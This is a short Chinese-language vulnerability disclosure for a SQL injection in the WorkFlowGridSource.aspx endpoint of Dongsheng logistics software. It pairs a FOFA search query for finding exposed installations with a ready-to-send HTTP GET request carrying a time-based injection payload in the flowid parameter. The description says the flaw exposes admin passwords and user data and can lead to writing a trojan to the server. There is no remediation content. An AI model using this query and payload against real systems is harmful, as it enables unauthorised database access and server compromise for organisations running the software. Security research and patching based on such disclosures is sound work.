## 东胜物流软件-WorkFlowGridSource.aspx-SQL注入漏洞

## 一、漏洞简介
东胜物流软件 WorkFlowGridSource.aspx接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
app="东胜物流软件-物流软件"
```

## POC
```
GET /WorkFlow/WorkFlowGridSource.aspx?handle=steplist&flowid=-1';WAITFOR DELAY'0:0:5' HTTP/1.1
Host: [被遮挡，实际域名或IP]
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
```
